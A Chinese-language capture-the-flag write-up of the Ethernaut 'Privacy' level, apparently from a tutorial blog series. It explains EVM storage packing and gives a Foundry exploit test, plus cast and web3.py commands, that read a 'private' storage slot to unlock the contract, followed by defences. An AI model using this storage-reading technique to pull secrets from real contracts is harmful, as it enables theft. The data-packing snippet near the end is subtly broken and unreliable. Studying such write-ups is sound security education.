---
title: 'Ethernaut Level 12: Privacy - 存储布局分析'
date: 2025-01-25 16:00:00
updated: 2025-01-25 16:00:00
categories:
  - Ethernaut 系列
  - 进阶攻击篇 (11-20)
tags:
  - Ethernaut
  - Foundry
  - 存储布局分析
  - 私有变量读取
  - 智能合约安全
  - Solidity
  - EVM存储
series: Ethernaut Foundry Solutions
excerpt: "深入学习 EVM 存储布局和复杂数据结构的存储机制，掌握 Privacy 关卡的攻击技术。理解静态数组、数据打包和存储槽位计算。"
---

# 🎯 Ethernaut Level 12: Privacy - 存储布局分析

> **关卡链接**: [Ethernaut Level 12 - Privacy](https://ethernaut.openzeppelin.com/level/12)  
> **攻击类型**: 存储布局分析  
> **难度**: ⭐⭐⭐⭐☆

## 📋 挑战目标

要读取 `private` 数据，然后调用 `unlock` 函数。这个关卡进一步考验对 EVM 存储布局的理解，特别是静态数组和数据打包的处理。

![Privacy Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel12.svg)

## 🔍 漏洞分析

### 目标函数分析

```solidity
function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));  // 需要 data[2] 的 bytes16 版本
    locked = false;
}
```

我们可以看到，此处的条件是 `_key` 必须等于 `bytes16(data[2])`。那么我们如何访问 `data[2]` 呢？

### 复杂存储布局分析

合约的状态变量：

```solidity
bool public locked = true;
uint256 public ID = block.timestamp;
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(block.timestamp);
bytes32[3] private data;
```

由于没有继承，存储从 slot 0 开始，带有 `locked` 变量，如下所示：

| Slot | Variable | Type | Size | Notes |
|------|----------|------|------|-------|
| 0 | `locked` | `bool` | 1 byte | `locked` 占用1个字节，但由于下一个值不适合剩下的31个字节，`locked` 占用了整个插槽 |
| 1 | `ID` | `uint256` | 32 bytes | `uint256` 占用32字节，所以是1个满槽 |
| 2 | `flattening`<br/>`denomination`<br/>`awkwardness` | `uint8`<br/>`uint8`<br/>`uint16` | 1+1+2 bytes | 分别是1个字节+1个字节+2个字节，Solidity将它们打包到一个插槽中 |
| 3 | `data[0]` | `bytes32` | 32 bytes | 静态数组启动一个新的存储槽，每个 `bytes32` 元素占用一个完整的槽 |
| 4 | `data[1]` | `bytes32` | 32 bytes | |
| 5 | `data[2]` | `bytes32` | 32 bytes | **这个槽位就是 `data[2]`** |

通过这个详细的存储布局，我们可以看到 `data[2]` 存储在 slot 5 中。

## 💻 Foundry 实现

### 攻击合约代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/PrivacyFactory.sol";

contract PrivacyTest is Test {
    Ethernaut ethernaut;
    PrivacyFactory privacyFactory;
    
    function setUp() public {
        ethernaut = new Ethernaut();
        privacyFactory = new PrivacyFactory();
        ethernaut.registerLevel(privacyFactory);
    }
    
    function testPrivacyExploit() public {
        // 创建关卡实例
        address levelInstance = ethernaut.createLevelInstance(privacyFactory);
        Privacy instance = Privacy(levelInstance);
        
        // 验证初始状态
        assertEq(instance.locked(), true);
        
        // 攻击：读取 slot 5 中的 data[2]
        bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));
        
        // 转换为 bytes16 并解锁
        bytes16 key = bytes16(data2);
        instance.unlock(key);
        
        // 验证攻击成功
        assertEq(instance.locked(), false);
        
        // 提交关卡
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelInstance)
        );
        assert(levelSuccessfullyPassed);
    }
    
    // 额外测试：验证存储布局
    function testStorageLayout() public {
        address levelInstance = ethernaut.createLevelInstance(privacyFactory);
        
        // 检查各个 slot 的内容
        bytes32 slot0 = vm.load(address(levelInstance), bytes32(uint256(0))); // locked
        bytes32 slot1 = vm.load(address(levelInstance), bytes32(uint256(1))); // ID
        bytes32 slot2 = vm.load(address(levelInstance), bytes32(uint256(2))); // packed variables
        bytes32 slot3 = vm.load(address(levelInstance), bytes32(uint256(3))); // data[0]
        bytes32 slot4 = vm.load(address(levelInstance), bytes32(uint256(4))); // data[1]
        bytes32 slot5 = vm.load(address(levelInstance), bytes32(uint256(5))); // data[2]
        
        console.log("Slot 0 (locked):", uint256(slot0));
        console.log("Slot 1 (ID):", uint256(slot1));
        console.log("Slot 2 (packed):");
        console.logBytes32(slot2);
        console.log("Slot 3 (data[0]):");
        console.logBytes32(slot3);
        console.log("Slot 4 (data[1]):");
        console.logBytes32(slot4);
        console.log("Slot 5 (data[2]):");
        console.logBytes32(slot5);
    }
}
```

### 关键攻击步骤

1. **分析存储布局**：确定 `data[2]` 存储在 slot 5
2. **读取存储**：使用 `vm.load()` 读取 slot 5 的数据
3. **数据转换**：将 `bytes32` 转换为 `bytes16`
4. **调用 unlock**：使用转换后的 key 解锁合约

```solidity
// 读取 slot 5 中的 data[2]
bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));

// 转换为 bytes16
bytes16 key = bytes16(data2);  // 取前16个字节

// 解锁合约
instance.unlock(key);
```

## 🛡️ 防御措施

### 1. 不要在链上存储敏感数据

```solidity
// ❌ 不安全：私有数据存储在链上
contract VulnerableContract {
    bytes32[3] private secretData;  // 仍然可以被读取！
    
    function unlock(bytes16 _key) public {
        require(_key == bytes16(secretData[2]));
        // unlock logic
    }
}

// ✅ 安全：使用哈希验证
contract SecureContract {
    bytes32 private dataHash;  // 存储哈希而不是明文
    
    constructor(bytes32 _data) {
        dataHash = keccak256(abi.encodePacked(_data));
    }
    
    function unlock(bytes32 _data) public {
        require(keccak256(abi.encodePacked(_data)) == dataHash);
        // unlock logic
    }
}
```

### 2. 使用承诺-揭示方案

```solidity
contract CommitReveal {
    mapping(address => bytes32) private commitments;
    mapping(address => bool) private revealed;
    
    // 第一阶段：提交哈希
    function commit(bytes32 _hashedData) public {
        commitments[msg.sender] = _hashedData;
    }
    
    // 第二阶段：揭示并验证
    function reveal(bytes32 _data, uint256 _nonce) public {
        bytes32 hash = keccak256(abi.encodePacked(_data, _nonce));
        require(commitments[msg.sender] == hash, "Invalid reveal");
        revealed[msg.sender] = true;
    }
}
```

## 🔧 相关工具和技术

### 存储布局分析工具

```bash
# 使用 forge inspect 查看存储布局
forge inspect <ContractName> storage-layout

# 使用 cast 读取存储
cast storage <CONTRACT_ADDRESS> <SLOT_NUMBER>

# 使用 web3.py 读取存储
from web3 import Web3
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))
data = w3.eth.get_storage_at(contract_address, 5)
```

### 数据类型转换

```solidity
// bytes32 到 bytes16 转换
bytes32 fullData = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;
bytes16 halfData = bytes16(fullData);  // 取前16个字节

// 数据打包解析
bytes32 packedData = 0x000000000000000000000000000a00ff0000000000000000000000000000;
uint8 flattening = uint8(packedData);           // 最后1字节
uint8 denomination = uint8(packedData >> 8);    // 倒数2字节  
uint16 awkwardness = uint16(packedData >> 16);  // 倒数3-4字节
```

## 🎯 总结

**核心概念**:
- 同样，链上是没有隐私。一切都是公开的，任何人都可以阅读
- 合理安排你的存储空间，可以节省 gas
- EVM 使用 32 字节的存储槽，小于 32 字节的类型会被打包

**攻击向量**:
- 通过存储布局分析找到目标数据的 slot 位置
- 使用 RPC 调用或 Foundry cheatcodes 读取数据
- 正确处理数据类型转换和数据打包

**防御策略**:
- 永远不要在链上存储明文敏感数据
- 使用哈希、承诺方案或链下验证
- 考虑使用加密存储解决方案
- 合理设计存储布局以提高效率

## 📚 参考资料

- [Private data](https://solidity-by-example.org/hacks/accessing-private-data/)
- [EVM storage](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)
- [Storage layout](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)

